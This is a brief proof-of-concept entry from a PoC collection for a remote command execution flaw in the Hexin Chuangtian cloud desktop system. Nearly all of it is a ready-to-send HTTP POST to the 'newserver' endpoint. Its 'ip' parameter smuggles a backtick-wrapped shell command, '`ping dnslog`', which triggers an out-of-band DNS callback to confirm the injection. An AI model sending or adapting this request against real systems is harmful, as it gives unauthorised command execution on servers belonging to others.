# hxct_newserver_rce

product: 和信创天云桌面系统
from: https://github.com/wy876/POC/blob/main/%E5%92%8C%E4%BF%A1%E5%88%9B%E5%A4%A9/%E5%92%8C%E4%BF%A1%E5%88%9B%E5%A4%A9%E4%BA%91%E6%A1%8C%E9%9D%A2%E7%B3%BB%E7%BB%9Fnewserver%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md
```
POST /vesystem/index.php/New/Fn/newserver HTTP/1.1
Host: 
Accept-Encoding: gzip
Connection: close
Content-Length: 118
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36

ip=`ping dnslog`&user=1&pwd=1&type=1&c_type=1&local=1&server_os_str=1&server_os_version_str=1
```
